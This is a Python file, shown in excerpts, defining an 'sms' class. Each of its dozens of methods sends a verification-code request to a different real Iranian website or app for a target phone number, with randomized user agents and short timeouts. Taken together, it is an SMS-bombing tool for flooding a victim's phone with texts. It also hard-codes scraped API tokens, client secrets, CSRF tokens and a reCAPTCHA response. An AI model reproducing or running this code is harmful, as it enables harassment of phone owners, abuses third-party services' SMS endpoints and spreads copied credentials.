...
class sms:
    ...
    def snap(self):
        ...
        snapD = {"cellphone": self.phone}
        try:
            post(url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",timeout=1,headers=snapH, json=snapD)
            return True
        except:return False
    ...
    def shad(self):
        ...
        shadD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": self.phone.split("+")[1], "send_type": "SMS"}}
        try:
            post(url="https://shadmessenger12.iranlms.ir/",timeout=1,headers=shadH, json=shadD)
            return True
        except:return False
    ...
    def tap30(self):
        ...
        tap30D = {"credential": {"phoneNumber": "0" + self.phone.split("+98")[1], "role": "PASSENGER"}}
        try:
    ...
    def emtiaz(self):
        ...
        emD = "send=1&cellphone=0"+self.phone.split("+98")[1]
        try:
            post(url="https://web.emtiyaz.app/json/login",timeout=1,headers=emH, data=emD)
            return True
        except:return False
    ...
    def divar(self):
        ...
        divarD = {"phone": self.phone.split("+98")[1]}
        try:
    ...
    def rubika(self):
        ...
        ruD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": self.phone.split("+")[1], "send_type": "SMS"}}
        try:
            post(url="https://messengerg2c4.iranlms.ir/",timeout=1,headers=ruH, json=ruD)
            return True
        except:return False
    ...
    def bama(self):
        ...
        bamaD = "cellNumber=0"+self.phone.split("+98")[1]
        try:
            post(url="https://bama.ir/signin-checkforcellnumber",timeout=1,headers=bamaH, data=bamaD)
            return True
        except:return False
    ...
    def alibaba(self):
        ...
        alibabaD = {"phoneNumber": "0"+self.phone.split("+98")[1]}
        try:
    ...
    def smarket(self):
        smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{self.phone.split("+98")[1]}'
        smarketH = {'referer': 'https://snapp.market/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=smarketU,timeout=1,headers=smarketH)
            return True
        except:return False
    ...
    def arka(self):
        ...
        arkaD = {"mobile": "0" + self.phone.split("+98")[1], "country_code": "IR", "provider_code": "RUBIKA"}
        try:
            post(url='https://api.chartex.net/api/v2/user/validate',timeout=1,headers=arkaH, json=arkaD)
            return True
        except:return False
    ...
    def sTrip(self):
        ...
        sTripD = {"lang": "fa", "country_id": "860", "password": "snaptrippass", "mobile_phone": "0" + self.phone.split("+98")[1], "country_code": "+98", "email": "example@gmail.com"}
        try:
    ...
    def filmnet(self):
        fnU = f"https://api-v2.filmnet.ir/access-token/users/{self.phone}/otp"
        ...
        try:
            get(url=fnU,timeout=1,headers=fNh)
            return True
        except:return False
    ...
    def drdr(self):
        ...
        try:
            post(url=dru,timeout=1,headers=drh, params={"phoneNumber": self.phone, "userType": "PATIENT"})
            return True
        except:return False


    def bahram_shop(self):
        __rhead = {"user-agent": generate_user_agent()}
        bahram_request = {"username": "0"+self.phone.split("+98")[1]}
        bahram = 'https://api.bahramshop.ir/api/user/validate/username'
        try:
            for i in range(0, 2):
                post(bahram, json=bahram_request,timeout=1,headers=__rhead)
                sleep(0.2)
            return True
        except:return False
    ...
    def banimode(self):
        bnJ = {"phone": '0'+self.phone.split('+98')[1]}
        ...
        try:
            post(url=bnU,timeout=1,headers=bnH, json=bnJ)
            return True
        except:return False
    ...
    def okcs(self):
        __rhead = {"user-agent": generate_user_agent()}
        try:
            get(url="https://okcs.com/users/mobilelogin?mobile=0" + self.phone.split("+98")[1],timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def binjo(self):
        __rhead = {"user-agent": generate_user_agent()}
        try:
            get(url="https://api.binjo.ir/api/panel/get_code/0" + self.phone.split("+98")[1],timeout=1,headers=__rhead)
            return True
        except:return False


    def chamedoon(self):
        chJ = {"mobile": '0'+self.phone.split('+98')[1],"origin": "/","referrer_id": None}
        ...
        try:
            post(url=chU,timeout=1,headers=chH, json=chJ)
            return True
        except:return False


    def kilid(self):
        kiJ = {"mobile": '0'+self.phone.split('+98')[1]}
        ...
        try:
            post(url=kiU,timeout=1,headers=kiH, json=kiJ)
            return True
        except:return False
    ...
    def pinket(self):
        __rhead = {"user-agent": generate_user_agent()}
        pinket_request = {"phoneNumber": "0"+self.phone.split("+98")[1]}
        pinket_url = 'https://pinket.com/api/cu/v2/phone-verification'
        try:
            post(pinket_url, json=pinket_request,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def otaghak(self):
        __rhead = {"user-agent": generate_user_agent()}
        otaghak_request = {"userName": "0"+self.phone.split("+98")[1]}
        otaghak_url = 'https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode'
        try:
            post(otaghak_url, json=otaghak_request,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def shab(self):
        __rhead = {"user-agent": generate_user_agent()}
        shab_request = {"mobile": "0"+self.phone.split("+98")[1], "country_code": "+98"}
        shab_url = 'https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile'
        try:
            post(shab_url, json=shab_request,timeout=1,headers=__rhead)
            return True
        except:return False


    def itoll(self):
        itJ = {'mobile': self.phone}
        ...
        try:
            post(url=itU,timeout=1,headers=itH, json=itJ)
            return True
        except:return False
    ...
    def pubisha(self):
        __rhead = {"user-agent": generate_user_agent()}
        pubisha_request = "mobile=0"+self.phone.split("+98")[1]
        pubisha_url = 'https://www.pubisha.com/login/checkCustomerActivation'
        try:
            post(pubisha_url, json=pubisha_request,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def wis(self):
        try:
            post("https://gateway.wisgoon.com/api/v1/auth/login/",json={"phone": "0"+self.phone.split("+98")[1], "recaptcha-response": "03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg","token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"},timeout=1,headers={"Host": "gateway.wisgoon.com","content-length": "582","accept": "application/json","save-data": "on","user-agent": generate_user_agent(os="android"),"content-type": "application/json","origin": "https://m.wisgoon.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.wisgoon.com/","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7", })
            return True
        except:return False
    ...
    def digipay(self):
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://app.mydigipay.com/digipay/api/users/send-sms", json={"cellNumber": "0"+self.phone.split("+98")[1], "device": {"deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f", "deviceModel": "WEB_BROWSER", "deviceAPI": "WEB_BROWSER", "osName": "WEB"}},headers=__rhead)
            return True
        except:return False
    ...
    def gap(self):
        ...
        try:
            get(url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(self.phone.split("+")[1]),timeout=1,headers=gapH).text
            return True
        except:return False


    def torob(self):
        phone = '0'+self.phone.split('+98')[1]
        ...
        try:
            torobR = get(url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}",timeout=1,headers=torobH)
            return True
        except:return False
    ...
    def taghche(self):
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://gw.taaghche.com/v4/site/auth/signup",json={"contact": "0"+self.phone.split("+98")[1]},headers=__rhead)
            return True
        except:return False
    ...
    def namava(self):
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json={"UserName": self.phone},headers=__rhead )
            return True
        except:return False
    ...
    def sheypoor(self):
        ...
        sheyporD = {"username": "0"+self.phone.split("+98")[1]}
        try:
            post(url='https://www.sheypoor.com/auth',timeout=1,headers=sheyporH, data=sheyporD)
            return True
        except:return False
    ...
    def doctor(self):
        __rhead = {"user-agent": generate_user_agent()}
        try:
            get(f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{self.phone.split("+98")[1]}/sms?cCode=+98',timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def achar(self):
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.achareh.ir/v2/accounts/login/',data={"phone": "0"+self.phone.split("+98")[1], "utm_source": "null"},timeout=1,headers=__rhead )
            return True
        except:return False
    ...
    def snapp(self):
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.snapp.ir/api/v1/sms/link',json={"phone": "0"+self.phone.split("+98")[1]},headers=__rhead )
            return True
        except:return False
    ...
    def tap30(self):
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.tapsi.cab/api/v2/user', json={"credential": {"phoneNumber": "0"+self.phone.split("+98")[1], "role": "PASSENGER"}},timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def tmg(self):
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://tagmond.com/phone_number', data='utf8=%E2%9C%93&phone_number=' +"0"+self.phone.split("+98")[1]+'&g-recaptcha-response=',timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def a4baz(self):
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://a4baz.com/api/web/login',json={"cellphone": "0"+self.phone.split("+98")[1]},timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def doctoreto(self):
        try:
            ...
            json={"mobile": "0"+self.phone.split("+98")[1], "country_id": 205}, 
    ...
    def okorosh(self):
        ...
        try:
            post(url=okU,timeout=1,headers=okH, json=okJ).text
            return True
        except:return False


    def gapfilm(self):
        gaJ = {"Type": 3,"Username": self.phone.split("+98")[1],"SourceChannel": "GF_WebSite","SourcePlatform": "desktop","SourcePlatformAgentType": "Opera","SourcePlatformVersion": "82.0.4227.33","GiftCode": None}
        ...
        try:
            post(url=gaU,timeout=1,headers=gaH, json=gaJ)
            return True
        except:return False


    def anar(self):
        anrJ = {'user': self.phone, 'app_id': 99}
        ...
        try:
            post(url=anrU,timeout=1,headers=anrH, json=anrJ)
            return True
        except:return False


    def azki(self):
        azkU = f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{self.phone}"%7D'
        ...
        try:
            post(url=azkU,timeout=1,headers=azkH)
            return True
        except:return False


    def nobat(self):
        noJ = {'mobile': self.phone}
        ...
        try:
            post(url=noU,timeout=1,headers=noH, json=noJ)
            return True
        except:return False


    def lendo(self):
        leD = {'_token': 'mXBVe062llzpXAxD5Ez__n4b5yqrSuWJMVPl1dFTV6','mobile': '0'+self.phone.split('+98')[1],'password': 'ibvvb@3#9nc'}
        ...
        try:
            post(url=leU,timeout=1,headers=leH, data=leD).text
            return True
        except:return False


    def olgoo(self):
        olD = {'contactInfo[mobile]': '0'+self.phone.split('+98')[1],'contactInfo[agreementAccepted]': '1','contactInfo[teachingFieldId]': '1','contactInfo[eduGradeIds][7]': '7','submit_register': '1'}
        ...
        try:
            post(url=olU,timeout=1,headers=olH, data=olD).text
            return True
        except:return False


    def pakhsh(self):
        paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.phone.split("+98")[1]}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
        ...
        try:
            post(url=paU,timeout=1,headers=paH, data=paD)
            return True
        except:return False


    def didnegar(self):
        paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo={self.phone.split("+98")[1]}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{self.phone.split("+98")[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
    ...
    def baskol(self):
        baJ = {"phone": '0'+self.phone.split('+98')[1]}
        ...
        try:
            post(url=baU,timeout=1,headers=baH, json=baJ)
            return True
        except:return False


    def basalam(self):
        baJ = {"variables": {"mobile": '0'+self.phone.split('+98')[1]},"query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"}
    ...
    def see5(self):
        seD = {'mobile': '0'+self.phone.split('+98')[1],'action': 'sendsms'}
        ...
        try:
            post(url=seU,timeout=1,headers=seH, data=seD).text
            return True
        except:return False


    def ghabzino(self):
        ghJ = {"Parameters": {"ApplicationType": "Web","ApplicationUniqueToken": None,"ApplicationVersion": "1.0.0","MobileNumber": '0'+self.phone.split('+98')[1]}}
        ...
        try:
            get(url=ghU,timeout=1,headers=ghH, json=ghJ)
            return True
        except:return False


    def simkhanF(self):
        ghJ = {"mobileNumber": '0'+self.phone.split('+98')[1],"ReSendSMS": False}
        ...
        try:
            post(url=ghU,timeout=1,headers=ghH, json=ghJ)
            return True
        except:return False


    def simkhanT(self):
        ghJ = {"mobileNumber": '0'+self.phone.split('+98')[1],"ReSendSMS": True}
        ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
        ghH = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Authorization': 'Bearer undefined','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'www.simkhanapi.ir','Origin': 'https://simkhan.ir','Referer': 'https://simkhan.ir/','User-Agent': generate_user_agent(os="linux")}
        try:
            post(url=ghU,timeout=1,headers=ghH, json=ghJ)
    ...
    def drsaina(self):
        ghD = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJ__n4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+self.phone.split('+98')[1]}&confirmCode=&fullName=&Password=&Password2="
        ...
        try:
            post(url=ghU,timeout=1,headers=ghH, data=ghD).text
            return True
        except:return False


    def limome(self):
        liD = {'mobileNumber': self.phone.split('+98')[1],'country': '1'}
        ...
        try:
            post(url=liU,timeout=1,headers=liH, data=liD)
            return True
        except:return False


    def bimito(self):
        liU = f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220{self.phone.split('+98')[1]}%22%7D"
        ...
        try:
            post(url=liU,timeout=1,headers=liH)
            return True
        except:return False


    def seebirani(self):
        liJ = {"username": "0"+self.phone.split('+98')[1]}
        ...
        try:
            post(url=liU,timeout=1,headers=liH, json=liJ)
            return True
        except:return False


    def mihanpezeshk(self):
        gaD = f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+self.phone.split("+98")[1]}&recaptcha='
        ...
        try:
            post(url=gaU,timeout=1,headers=gaH, data=gaD)
            return True
        except:return False
    ...
    def mek(self):
        ...
        meD = {"landingPageUrl": "https://www.hamrah-mechanic.com/","orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/","phoneNumber": "0"+self.phone.split("+98")[1],"prevDomainUrl": None,"prevUrl": None,"referrer": "https://www.google.com/"}
        try:
            post(url=meU,timeout=1,headers=meH, data=meD)
            return True
        except:return False
    ...
    def hyperjan(self):
        __rhead = {"user-agent": generate_user_agent()}
        snapD = {"mobile": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://shop.hyperjan.ir/api/users/manage", json=snapD,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def digikala(self):
        __rhead = {"user-agent": generate_user_agent()}
        __n4 = {"username": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://api.digikala.com/v1/user/authenticate/", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False


    def devslop(self):
        n5 = self.phone.split("+98")[1]
        __n4 = f"number=0{n5}&state=number&"
        ...
        try:
            post(url="https://i.devslop.app/app/ifollow/api/otp.php",timeout=1,headers=headers, data=__n4)
            return True
        except:return False
    ...
    def hiword(self):
        __rhead = {"user-agent": generate_user_agent()}
        __n4 = {"identifier": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://hiword.ir/wp-json/otp-login/v1/login", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def abantether(self):
        __rhead = {"user-agent": generate_user_agent()}
        __n4 = {"phoneNumber": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://abantether.com/users/register/phone/send/", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def bit24(self):
        __rhead = {"user-agent": generate_user_agent()}
        __n4 = {"mobile": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://api.bit24.cash/api/v3/auth/check-mobile", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def dicardo(self):
        __rhead = {"user-agent": generate_user_agent()}
        __n4 = {"phone": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://dicardo.com/main/sendsms", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def ghasedak24(self):
        ...
        __n4 = {"username": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://ghasedak24.com/user/ajax_register", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def tikban(self):
        __rhead = {"user-agent": generate_user_agent()}
        __n4 = {"CellPhone": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://tikban.com/Account/LoginAndRegister", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def digistyle(self):
        __rhead = {"user-agent": generate_user_agent()}
        __n4 = {"loginRegister[email_phone]": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://www.digistyle.com/users/login-register/", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def banankala(self):
        ...
        __n4 = {"Mobile": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://banankala.com/home/login", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def iranketab(self):
        ...
        __n4 = {"UserName": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://www.iranketab.ir/account/register", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def ketabchi(self):
        ...
        __n4 = {"phoneNumber": "0"+self.phone.split("+98")[1]}
        try:
            post(url="https://ketabchi.com/api/v1/auth/requestVerificationCode", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def tapsi(self):
        ...
        n5 = self.phone.split("+98")[1]
        try:
            post(url=f"https://join.tapsi.ir/smsConfirm?phoneNumber=0{n5}",timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def offdecor(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.offdecor.com/index.php?route=account/login/sendCode", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False


    def exo(self):
        __n4 = {"mobile_number": "0"+self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://exo.ir/index.php?route=account/mobile_login", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def shahrfarsh(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://shahrfarsh.com/Account/Login", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def takfarsh(self):
        __n4 = {"phone_email": "0"+self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False


    def beheshticarpet(self):
        __n4 = {"billing_mobile": "0"+self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://shop.beheshticarpet.com/my-account/", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def khanoumi(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.khanoumi.com/accounts/sendotp", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def rojashop(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://rojashop.com/api/auth/sendOtp", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def dadpardaz(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://dadpardaz.com/advice/getLoginConfirmationCode", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def rokla(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.rokla.ir/api/request/otp", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def khodro45(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://khodro45.com/api/v1/customers/otp/", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False


    def mashinbank(self):
        __n4 = {"mobileNumber": "0"+self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://mashinbank.com/api2/users/check", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def pezeshket(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.pezeshket.com/core/v1/auth/requestCode", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def virgool(self):
        __n4 = {"method": "phone", "identifier": self.phone}
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://virgool.io/api/v1.4/auth/verify", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def timcheh(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.timcheh.com/auth/otp/send", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def helsa(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url=f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber=0{n5}&deviceId=050102153736100048967953736091842424&discountCode=&utm_content=&utm_source=&utm_campain=",timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def paklean(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://client.api.paklean.com/user/resendCode", json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def mobogift(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://mobogift.com/signin", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def iranicard(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.iranicard.ir/api/v1/register", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def pubgsell(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://pubg-sell.ir/loginuser?username=0{n5}",timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def tj8(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://tj8.ir/auth/register", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def cinematicket(self):
        __n4 = {"phone_number": "0"+self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://cinematicket.org/api/v1/users/signup", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def irantic(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.irantic.com/api/login/request", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False


    def kafegheymat(self):
        __n4 = {"phone": "0"+self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://kafegheymat.com/shop/getLoginSms", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def express(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def delino(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.delino.com/user/register", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def alopeyk(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://alopeyk.com/api/sms/send.php", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def tamland(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://1401api.tamland.ir/api/user/signup", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False


    def opco(self):
        __n4 = {"telephone": "0"+self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False


    def digikalajet(self):
        __n4 = {"phone": "0"+self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.digikalajet.ir/user/login-register/", data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def melix(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://melix.shop/site/api/v1/user/otp", json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def safiran(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://safiran.shop/login", json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False



    def deyfriedchicken(self):
        js = {"apiToken":"VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq","clientSecret":"7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq","device":"web","username":"0" + self.phone.split("+98")[1]}

        __rhead = {"user-agent": generate_user_agent()}
        try: #shop.deyfriedchicken.com
            post(url="https://restaurant.delino.com/user/register",json=js,timeout=1,headers=__rhead)
            return True
        except:return False


            
    def donergarden(self):
        js = {"apiToken":"Ex0OHO6iS8ZfklgSKhaTmWAp34lYLNLFZvMXiuVfhc2ov2uq9kpwYUUrxTWNnhWE","clientSecret":"BuUDcLI9IMQNpWeaHYtVfKzoxwEZNza4","device":"web","username":"0" + self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try: #donergarden.com
            post(url="https://restaurant.delino.com/user/register",json=js,timeout=1,headers=__rhead)
            return True
    ...
    def foodbell(self):
        js = {"apiToken":"WTKnmBBIpjL8kcOo7YGD0qkaa6p06bVER9IMUNsyVOj9J2AMlmjESWhqtuNqWBNN","clientSecret":"aINO67nX5aCs5e7382XQJZkYbROBBewt","device":"web","username":"0" + self.phone.split("+98")[1]}
    ...
    def foodiran16(self):
        js = {"apiToken":"mUkchCAJ9Po58IqEzz507gKwv5mz2kzplUctHuTxXDrTAfjfHyPJqXKGJxrnaKSX","clientSecret":"HVB23K4Y9LPvOLuUCTo3QOHolaYGupgP","device":"web","username":"0" + self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try: #foodiran16.com
            post(url="https://restaurant.delino.com/user/register",json=js,timeout=1,headers=__rhead)
            return True
    ...
    def foodlandkish(self):
        js = {"apiToken":"KbCO8YaHKctowfL1Rny8gB9A9B2kGZvHJBbN918Nsn1p2Ui0FbLWdJ1JdCQ6hzAu","clientSecret":"MvfPc5BT2lRrpmOCYZzAAGg7d7J8ZVnv","device":"web","username":"0" + self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
    ...
    def garcon(self):
        js = {"phone":"0" + self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://garcon.tandori.ir/users/v1/main/login",json=js,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def gelatohouse(self):
        js = {"apiToken":"10tQStiKTniALgYpYQ4hm0UCuadXWbHdMklMIpyTE5DSzkNSfx1r2p02pqg3QKx3","clientSecret":"MZ0TNC0swsGFk6gbfCdvtZHRukZyFntu","device":"web","username":"0" + self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
    ...
    def givernfood(self):
        js = {"apiToken":"iIWfAtW16GstuASFfuUO0iY9LKz3dKQpdsKZ2ANBK5YokN2J7pom4oq0tYTz5eXv","clientSecret":"mpZYwzraYAyzcpD594LpWbHwTgHIcdNO","device":"web","username":"0" + self.phone.split("+98")[1]}
    ...
    def mahiyekhoob(self):
        js = {"apiToken":"yJHp0J8gMDyUlAvrWC2E7G0OITtM18WXdRZdGSC2gKkkC8QHDBDsf5irJ4gpZvqP","clientSecret":"uTsq8sG1YWuIWcvK24UFtPighOfrl2H6","device":"web","username":"0" + self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try: #mahiyekhoob.com
            post(url="https://restaurant.delino.com/user/register",json=js,timeout=1,headers=__rhead)
            return True
    ...
    def nesengrill(self):
        js = {"apiToken":"GAbsdbjms1fx2ow35UnRCxxIbYPaNTfbq67clc9r09TtjqcxzrAbNFLTNSRFLJZZ","clientSecret":"gK6flStcuutxn82oGDqGqFqrvDTTQEZ2","device":"web","username":"0" + self.phone.split("+98")[1]}
    ...
    def pirankalaco(self):
        ...
        try: 
            post(url="https://pirankalaco.ir/shop/SendPhone.php",data=f"phone=0{self.phone.split('+98')[1]}",headers=head)
            return True
        except:return False

            
    def pizzapanjereh(self):
